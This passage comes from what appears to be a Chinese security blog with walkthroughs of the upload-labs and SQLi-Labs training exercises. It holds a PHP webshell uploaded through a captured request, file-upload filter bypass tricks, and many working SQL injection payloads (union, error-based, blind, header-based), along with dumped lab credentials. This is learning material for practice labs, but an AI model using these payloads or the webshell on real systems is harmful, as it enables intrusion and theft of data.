ktqnjloginusername=admin; ktqnjloginrnd=5I62uWWbyxT9vB9Fi6FU; ktqnjloginlevel=1; ktqnjloginecmsckpass=35f1e6e02526a8193d735f89d9093f80; ktqnjloginecmsckfrnd=gkgk52G7rpQ6xWOHlfLWxgdFpG9; ktqnjloginecmsckfdef=N0VHyuu3ljnoPVbceYkXaX; ktqnjemecOYNqOjnu=BXWggMbbslguQiExvN; Hm_lpvt_b5514a35664fd4ac6a893a1e56956c97=1637222890; thinkphp_show_page_trace=0|0; eth0_time=1637226896; eth0_num=0; eth0=249.118; login_auto=YXs3g0Y%3D%7C0e2c7f3efd15db77ba3f2ec9ab35f8347cb5be0d</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------326774743432415414462475084350</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;webshell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$shell = $_REQUEST[&#x27;shell&#x27;];</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">system($shell, $status);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">$shell = &quot;&lt;font color=&#x27;red&#x27;&gt;$shell&lt;/font&gt;&quot;;</span><br><span class="line">if( $status )&#123;echo &quot;shell命令&#123;$shell&#125;执行失败&quot;;</span><br><span class="line">&#125; else &#123;echo &quot;shell命令&#123;$shell&#125;成功执行&quot;;&#125;</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------326774743432415414462475084350--</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.328888.xyz/2022/04/24/2v7u1.png"><br>得到地址访问：<a target="_blank" rel="noopener" href="http://158.247.233.5:50097/public/edit/20220424/577f278522e01d80faa787a5b54d1148.php?shell=ls%20/tmp">http://158.247.233.5:50097/public/edit/20220424/577f278522e01d80faa787a5b54d1148.php?shell=ls%20/tmp</a></p>
<h1 id="upload闯关"><a href="#upload闯关" class="headerlink" title="upload闯关"></a>upload闯关</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>在前端改，将判断条件删除</p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>只验证Content-type<br>在后端改，burp抓包，将png后缀改为.php</p>
<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>黑名单绕过<br>burp抓包，将png改为.php4</p>
<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>burp抓包，先上传一个.htaccess（注意要抓包后将文件名删除只留后缀）然后在上传包含一句话木马的文件（.png）</p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><ul>
<li>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</li>
<li>htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</li>
<li>htaccess的用途范围主要针对当前目录。<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2>大小写绕过<br>上传.PHP<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2>空格绕过<br>burp抓包，将png改为.php (在PHP后加一个空格)<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2>点绕过<br>burp抓包，将png改为.php.(在PHP后加一个点，这是Windows的特性：会自动去掉后缀名中最后的”.”，它本身存在的漏洞)</li>
</ul>
<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>::$DATA绕过（Windows的特性会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名）<br>burp抓包，将png改为.php::$DATA </p>
<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>点+空格+点绕过<br>代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名<br>burp抓包，将png改为.php. .(在php后加点空格点)</p>
<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>双写绕过<br>burp抓包，将png改为.phphpp（双写绕过）</p>
<h2 id="十一关"><a href="#十一关" class="headerlink" title="十一关"></a>十一关</h2><p>00截断：<a target="_blank" rel="noopener" href="https://tatsumaki.cn/2020/07/29/00jieduan/">https://tatsumaki.cn/2020/07/29/00jieduan/</a><br>上传.png等合格文件，burp抓包，在第一行save-path路径后面加文件名改为php后缀和%00<br>如：POST /Pass-11/index.php?save_path=../upload/a.php%00 HTTP/1.1</p>
<h2 id="十二关"><a href="#十二关" class="headerlink" title="十二关"></a>十二关</h2><p>00截断<br>上传1.php (加一个空格用于占位)，burp抓包，打开hex将20改为00（空格的十六进制为20）<br>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。由于无法自行解码所以我们需要在hex中找到相对应的位置将数字修改为00.</p>
<h2 id="十三关"><a href="#十三关" class="headerlink" title="十三关"></a>十三关</h2><p>图片木马<br>利用文件包含漏洞<br>上传一个小的GIF，burp抓包，将<?php phpinfo();?>加在后面，然后发包，然后访问<a target="_blank" rel="noopener" href="http://158.247.233.5:27277/include.php?file=upload/3320220412065937.gif%EF%BC%88%E8%87%AA%E5%B7%B1%E6%8B%BC%E6%8E%A5%EF%BC%89">http://158.247.233.5:27277/include.php?file=upload/3320220412065937.gif（自己拼接）</a><br>文件包含漏洞</p>
<h2 id="十四关"><a href="#十四关" class="headerlink" title="十四关"></a>十四关</h2><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13<br>在图片码中加入gif的文件头，然后利用文件包含来读取</p>
<h2 id="十五关"><a href="#十五关" class="headerlink" title="十五关"></a>十五关</h2><p>php_exif模块来判断文件类型，用图片马绕过,同pass-13</p>
<h2 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h2><p>同上</p>
<h2 id="十七关"><a href="#十七关" class="headerlink" title="十七关"></a>十七关</h2><p>二次渲染绕过<br>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符/图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败.<br>图片马可以上传但是却没有解析，因为二次渲染把PHP代码删掉了<br>把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。（比较工具：HxD Hex Editor）</p>
<h2 id="十八关"><a href="#十八关" class="headerlink" title="十八关"></a>十八关</h2><h3 id="条件竞争是什么？"><a href="#条件竞争是什么？" class="headerlink" title="条件竞争是什么？"></a>条件竞争是什么？</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关<br>操作顺序设计的不合理时，将会导致此类问题的发生<br>原理<br>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后扌进行判断：如果文件格式符合要求，则重命名，<br>如果文件格式不符合要求，将文件刪除<br>由于服务器并发处理（同时）多个请求，<br>假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a<br>用户上传的文件，<br>会有以下三种情况：<br>1.访问时间点在上传成功之前，没有此文件<br>2.访问时间点在刚上传成功但还没有进行判断，<br>该文件存在<br>13.访问时间点在判断之后，文件被删除，没有此文件</p>
<p>直接上传一个php文件，然后进行抓包，将数据包发送至intruder下，清空变量，修改payload type为null payloads，再修改线程，number of threads为20，然后发包，用另一个浏览器一直访问18.php地址，只要在上传的一瞬间，他还没来的及删除、修改就可以了</p>
<h2 id="十九关"><a href="#十九关" class="headerlink" title="十九关"></a>十九关</h2><ul>
<li>00截断，同上<br>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.</li>
<li>或者burp抓包，将upload-19.jpg改为upload-19.php/.</li>
</ul>
<h2 id="二十关"><a href="#二十关" class="headerlink" title="二十关"></a>二十关</h2><p>数组绕过验证<br><img src="https://s1.328888.xyz/2022/04/15/i5ZoR.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-SQLi-Labs闯关笔记" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/03/23/SQLi-Labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/" class="article-date">
  	<time datetime="2022-03-23T07:58:34.394Z" itemprop="datePublished">2022-03-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/23/SQLi-Labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">
        SQLI-LABS闯关笔记
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><h3 id="1-please-input-the-id-as-parameter-with-numeric-value-请以数字值作为参数输入用户标示符"><a href="#1-please-input-the-id-as-parameter-with-numeric-value-请以数字值作为参数输入用户标示符" class="headerlink" title="1. please input the id as parameter with numeric value 请以数字值作为参数输入用户标示符"></a>1. please input the id as parameter with numeric value 请以数字值作为参数输入用户标示符</h3><ul>
<li>打开harkbar：<a target="_blank" rel="noopener" href="http://45.32.113.109:55102/Less-1/?id=1">http://45.32.113.109:55102/Less-1/?id=1</a></li>
<li>结果：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb ，Your Password:Dumb</span><br></pre></td></tr></table></figure></li>
<li>当ID的值不同会返回不同的结果值</li>
<li>对应的实际语句是<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; LIMIT 0,1;  </span><br></pre></td></tr></table></figure></li>
<li>这样也可以实现注入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-1/?id=1&#x27; or 1=1 --+  </span><br></pre></td></tr></table></figure>
<h3 id="2-使用order-by-拆解字段"><a href="#2-使用order-by-拆解字段" class="headerlink" title="2. 使用order by 拆解字段"></a>2. 使用order by 拆解字段</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1&#x27; order by 1--+</span><br></pre></td></tr></table></figure>
 当order by 4时，显示 Unknown column ‘4’ in ‘order clause’ 表示表有三列</li>
</ul>
<h3 id="3-查找数据库"><a href="#3-查找数据库" class="headerlink" title="3. 查找数据库"></a>3. 查找数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-1/?id=1&#x27; and 1=2 union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
<p>得到结果：<br>Your Login name:security<br>Your Password:3</p>
<p>Your Login name:2<br>Your Password:security</p>
<h3 id="4-查询表名"><a href="#4-查询表名" class="headerlink" title="4. 查询表名"></a>4. 查询表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-1/?id=1&#x27; and 1=2 union select  1,2,(group_concat(table_name)) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
<p>得到结果：<br>Your Login name:2<br>Your Password:emails,referers,uagents,users</p>
<p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-1/?id=1&#x27; and 1=2 union select  1,(group_concat(table_name)),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
<p>得到结果： Your Login name:emails,referers,uagents,users<br>Your Password:3 </p>
<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-1/?id=1&#x27; and 1=2 union select  1,(group_concat(column_name)),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
<p>得到结果：<br> Your Login name:id,username,password<br>Your Password:3</p>
<p> Your Login name:2<br>Your Password:id,username,password </p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:36189/Less-1/?id=-1&#x27; union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users--+  </span><br></pre></td></tr></table></figure>
<p> 得到结果： Your Login name: Dumb , Angelina , Dummy , secure , stupid , superman , batman , admin , admin1 , admin2 , admin3 , dhakkan , admin4<br>Your Password: Dumb , I-kill-you , p@ssword , crappy , stupidity , genious , mob!le , admin , admin1 , admin2 , admin3 , dumbo , admin4 </p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p> 基于错误的 - get - 数字型 .<br> 直接 ?id=1(不用加引号)</p>
<h3 id="查询数据-1"><a href="#查询数据-1" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:36189/Less-2/?id=1 and 1=2 union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users--+  </span><br></pre></td></tr></table></figure>
<p> 得到结果： Your Login name: Dumb , Angelina , Dummy , secure , stupid , superman , batman , admin , admin1 , admin2 , admin3 , dhakkan , admin4<br>Your Password: Dumb , I-kill-you , p@ssword , crappy , stupidity , genious , mob!le , admin , admin1 , admin2 , admin3 , dumbo , admin4 </p>
<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>基于错误的 - GET单引号变形字符型注入</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-3/?id=1</span><br></pre></td></tr></table></figure>
<p> 得到结果：Your Login name:Dumb<br>Your Password:Dumb</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:36189/Less-3/?id=-1&#x27;) union select 1,2,group_concat(id,username,password) from users--+  </span><br></pre></td></tr></table></figure>
<p>得到结果：Your Login name:2<br>Your Password:1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4</p>
<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>基于错误的get双引号字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:55102/Less-3/?id=1&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>双注入GET单引号字符型注入<br>没有回显，使用updatexml报错注入，1</p>
<p>/?id=1’ and updataxml(1,concat(0x7e,(select…),0x7e),1)–+<br>注：0x7e是“~”</p>
<ul>
<li>查表：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure></li>
<li>查users表的列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure></li>
<li>查数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h3><p>查表：select distinct concat(0x7e, (select group_concat(table_name)),0x7e) from information_schema.tables where table_schema=’security’<br>查列名：select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=’security’ and table_name=’users’<br>查数据：select distinct concat(0x7e, (select group_concat(username)),0x7e) from users</p>
<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>双注入GET双引号字符型注入<br>与第五关一样，将单引号改为双引号。</p>
<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>知识点：load_file（）：读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,&#x27;123&#x27;into outfile &quot;\var\lib\mysql\1.txt&quot;%23</span><br></pre></td></tr></table></figure>
<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔型单引号GET盲注</p>
<ul>
<li>判断数据库长度(回显正常为正确，一步步猜解)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-8/?id=1&#x27; and length(database())=8--+</span><br></pre></td></tr></table></figure></li>
<li>猜解数据库名(ascii码比r大等于s)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-8/?id=1&#x27;  and left(database(),1)&gt;&#x27;r&#x27;%23</span><br></pre></td></tr></table></figure></li>
<li>继续猜(以此类推）得到数据库名“security”<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-8/?id=1&#x27;  and left(database(),2)=&#x27;se&#x27;%23</span><br></pre></td></tr></table></figure></li>
<li>猜解表的第一个字符(改变limit的第一个值可以继续查询表的下一字符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-8/?id=1&#x27;  and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101%23</span><br></pre></td></tr></table></figure></li>
<li> 猜解users表的第一个字符(改变limit的第一个值可以继续查询表的下一字符）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-8/?id=1&#x27;   and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68%23</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>基于时间的GET单引号盲注<br>?id=1’ and if(length(database())=8 , sleep(3), 1) –+<br>时间延时说明正确</p>
<ul>
<li>判断数据库名第一个字符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;96,sleep(5),0)--+</span><br></pre></td></tr></table></figure></li>
<li>判断数据库名第二个字符（以此类推得到数据库名称“security”）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-9/?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;96,sleep(5),0)--+</span><br></pre></td></tr></table></figure></li>
<li>猜解表的第一个字符(改变limit的第一个值可以继续查询表的下一字符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-9/?id=1&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;96,sleep(5),0)--+</span><br></pre></td></tr></table></figure></li>
<li>猜解users表中列名的第一个字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-9/?id=1&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),2,1))&gt;96,sleep(5),0)--+</span><br></pre></td></tr></table></figure>
<ul>
<li>猜解password和username的值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.32.113.109:25001/Less-9/?id=1&#x27; and if(ascii(substr((select group_concat(password,username)from users),2,1))&gt;96,sleep(5),0)--+</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>基于时间的双引号盲注<br>将上一题的单引号改为双引号</p>
<h2 id="十一关"><a href="#十一关" class="headerlink" title="十一关"></a>十一关</h2><p>基于错误的POST型单引号字符型注入<br>burpsuit抓200的post包</p>
<ul>
<li>登录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=234&#x27; or 1=1--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
uname=admin’ and 1=2 union select…,2#&amp;passwd=admin&amp;submit=submit</li>
<li>查数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=234&#x27;and 1=2 union select 1,database()--+&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=234&#x27;and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查users表的列名(Your Password:id,username,password)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=234&#x27;and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查数据(Your Password:DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=234&#x27;and 1=2 union select 1,group_concat(username,password) from users--+&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="十二关"><a href="#十二关" class="headerlink" title="十二关"></a>十二关</h2><p>基于错误的POST型双引号字符型注入</p>
<ul>
<li>登录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=234&quot;) or 1=1--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
后续操作同less11</li>
</ul>
<h2 id="十三关"><a href="#十三关" class="headerlink" title="十三关"></a>十三关</h2><p>报错注入</p>
<ul>
<li>判断字段数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&#x27;) order by 4 #&amp;passwd=234&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查数据库名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select database()))) and (&#x27;&amp;passwd=234&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查表名（’~emails,referers,uagents,users’）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;))) and (&#x27;&amp;passwd=234&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查列名()<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))) and (&#x27;&amp;passwd=234&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
<li>查数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(username,password)from users))) and (&#x27;&amp;passwd=234&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="十四关"><a href="#十四关" class="headerlink" title="十四关"></a>十四关</h2><p>报错注入<br>同十三改为双引号</p>
<ul>
<li>查数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password)from users),0x7e))--+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="十五关"><a href="#十五关" class="headerlink" title="十五关"></a>十五关</h2><p>基于bool型/时间延迟单引号POST型盲注<br>没有回显可以通过pretty内容判断：flag为正确，slag为错误</p>
<ul>
<li>猜解数据库长<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&#x27;or 1=1 and (length(database())&gt;7)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
具体方法详见第八关</li>
</ul>
<h2 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h2><p>基于bool型/时间延迟的双引号POST型盲注<br>将十五的单引号该为你双引号</p>
<h2 id="十七关"><a href="#十七关" class="headerlink" title="十七关"></a>十七关</h2><p>update注入<br>uname=admin&amp;passwd=admin’ or updatexml(1,concat(0x7e,(select…)0x7e),1)#&amp;submit=submit</p>
<ul>
<li>查数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=admin&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;submit=submit</span><br></pre></td></tr></table></figure>
具体与第五关类似，使用updatexml报错注入<h2 id="十八关"><a href="#十八关" class="headerlink" title="十八关"></a>十八关</h2>http头——user-agent注入<br>在user-agent后输入反斜杠，返回SQL错误确定存在注入点</li>
<li>查版本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&#x27;and updatexml(1,concat(0x7e,(select @@version),0x7e),1)or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
User-Agent:’ and updatexml(1,concat(0x7e,(select database())),1) and ‘1’ =’1</li>
<li>查表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
具体与第五关类似，使用updatexml报错注入<h2 id="十九关"><a href="#十九关" class="headerlink" title="十九关"></a>十九关</h2>http头——referer注入<br>Referer:’and updatexml(1,concat(0x7e,(select database())),1)and ‘1’= ‘1<br>具体与第五关类似，使用updatexml报错注入<h2 id="二十关"><a href="#二十关" class="headerlink" title="二十关"></a>二十关</h2>cookie注入<br>打开harkbar add Header：cookie<br>在C字段注入</li>
<li>查数据库<br>Cookie: uname=admin’ and 1=2 union select database(),2,3 #</li>
<li>查表名<br>Cookie:uname=admin’ and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’#</li>
<li>查数据<br>uname=admin’ and 1=2 union select 1,2,group_concat(username,password) from users#</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
